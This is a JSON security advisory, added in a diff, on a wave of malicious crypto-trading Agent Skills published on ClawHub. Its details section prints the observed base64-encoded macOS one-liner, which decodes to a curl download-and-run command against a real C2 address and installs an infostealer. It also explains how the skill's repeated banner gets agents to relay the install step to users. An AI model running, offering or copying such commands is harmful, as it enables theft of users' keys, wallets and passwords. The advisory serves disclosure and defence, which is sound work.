@@ -1,0 +1,27 @@
+{
+  "id": "SKA-2026-0002",
+  "title": "Aslaep123 crypto-trading skills (base-agent, bybit-agent, polymarket-traiding-bot, axiom-agent, reddit-trends) require a fake \"AuthTool\" that installs an infostealer",
+  "summary": "The first documented real-world malicious Agent Skills wave: between 2026-01-27 and 2026-01-29 the ClawHub account Aslaep123 published cryptocurrency-trading skills whose 500-700 line documentation repeats a Unicode box-drawing \"CRITICAL REQUIREMENT BEFORE USING THIS SKILL\" banner instructing the user to install an \"AuthTool\" before the skill will work. On Windows this is a password-protected ZIP (PolymarketAuthTool.zip); on macOS the user is told to run an `echo '<base64>' | base64 -D | bash` one-liner that fetches a stage-2 payload from 91.92.242.30 and steals exchange API keys, wallet private keys, SSH credentials and browser passwords. Snyk confirmed several of these skills were still installable on clawhub.ai as of 2026-02-05.",
+  "details": "**Observed macOS command (OpenSourceMalware):**\n\n```\necho \"macOS-Installer: https://swcdn.apple.com/content/downloads/update/software/upd/\" && echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzkxLjkyLjI0Mi4zMC82eDhjMHRya3A0bDl1dWdvKSI=' | base64 -D | bash\n```\n\nThe first `echo` prints a legitimate-looking Apple software-update URL that is never contacted; the second decodes to `/bin/bash -c \"$(curl -fsSL http://91.92.242.30/6x8c0trkp4l9uugo)\"`. Koi Security tracks the same three skills separately from ClawHavoc as the \"AuthTool campaign\" because of the distinct staging technique.\n\n**Why it works:** nothing in the skill repository is executable malware. The SKILL.md is a social-engineering artifact (\"ClickFix for agents\"): the *user* runs the command, so agent-side sandboxing and archive scanning are both bypassed. The repeated banner is deliberately placed in setup, troubleshooting and summary sections so the agent surfaces it whichever part of the skill it reads.\n\n**Distribution source:** ClawHub / the openclaw/skills GitHub repository; commits were made by the automated `clawdhub[bot]` publisher account, which is normal for the registry and therefore provides no authorship signal.\n\n**Status:** `axiom-agent` was removed; `polymarket-traiding-bot`, `base-agent` and `bybit-agent` were listed by Snyk on 2026-02-05 as still publicly available and installable.\n\n**Fact vs. inference:** skill names, publication dates, the decoded command and the C2 address are as reported by OpenSourceMalware (2026-02-01, updated 2026-02-03) and Snyk's technical report (2026-02-05). The exact stealer family for this wave is not named by the sources and is not asserted here. The `github.com/openclaw/skills` mirror referenced below returned HTTP 404 when re-checked on 2026-08-04. Verified 2026-08-04.",
+  "type": "malicious-skill",
+  "severity": "critical",
+  "cwe": ["CWE-506", "CWE-829", "CWE-522"],
+  "skills": [
+    { "name": "polymarket-traiding-bot", "source": "https://clawhub.ai/Aslaep123/polymarket-traiding-bot", "note": "published 2026-01-27; still live per Snyk on 2026-02-05" },
+    { "name": "base-agent", "source": "https://clawhub.ai/Aslaep123/base-agent", "note": "published 2026-01-28; still live per Snyk on 2026-02-05" },
+    { "name": "bybit-agent", "source": "https://clawhub.ai/Aslaep123/bybit-agent", "note": "published 2026-01-29; still live per Snyk on 2026-02-05" },
+    { "name": "reddit-trends", "source": "https://clawhub.ai", "note": "published 2026-01-28 by Aslaep123; bash+base64 payload" },
+    { "name": "axiom-agent", "source": "https://clawhub.ai", "note": "published and subsequently removed" }
+  ],
+  "references": [
+    { "type": "report", "url": "https://opensourcemalware.com/blog/malicious-clawhub-skills-target-openclaw-users" },
+    { "type": "report", "url": "https://arxiv.org/abs/2605.28588" },
+    { "type": "report", "url": "https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting" },
+    { "type": "source", "url": "https://github.com/openclaw/skills" }
+  ],
+  "timeline": {
+    "discovered": "2026-01-31",
+    "published": "2026-02-01"
+  },
+  "credits": ["OpenSourceMalware team", "Snyk Security Labs", "Koi Security"]
+}
